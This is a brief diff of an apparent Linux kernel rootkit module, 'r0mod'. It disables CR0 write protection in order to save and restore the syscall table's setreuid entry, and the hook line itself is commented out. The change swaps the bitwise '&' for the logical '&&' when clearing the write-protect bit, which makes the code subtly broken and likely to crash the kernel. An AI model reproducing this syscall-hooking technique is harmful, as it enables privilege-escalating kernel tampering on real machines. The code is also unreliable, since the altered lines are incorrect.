@@ -180,7 +180,7 @@ static int __init r0mod_init(void)
 
     sys_found = 0;
 
-    write_cr0(read_cr0() & (~0x10000));
+    write_cr0(read_cr0() && (~0x10000));
     orig_setreuid = syscall_table[__NR_setreuid];
     //syscall_table[__NR_setreuid] = new_setreuid;
     write_cr0(read_cr0() | 0x10000);
@@ -197,7 +197,7 @@ static void __exit r0mod_exit(void)
 
     if(sys_found == 0)
     {
-        write_cr0(read_cr0() & (~0x10000));
+        write_cr0(read_cr0() && (~0x10000));
         syscall_table[__NR_setreuid] = orig_setreuid;
         write_cr0(read_cr0() | 0x10000);
     }
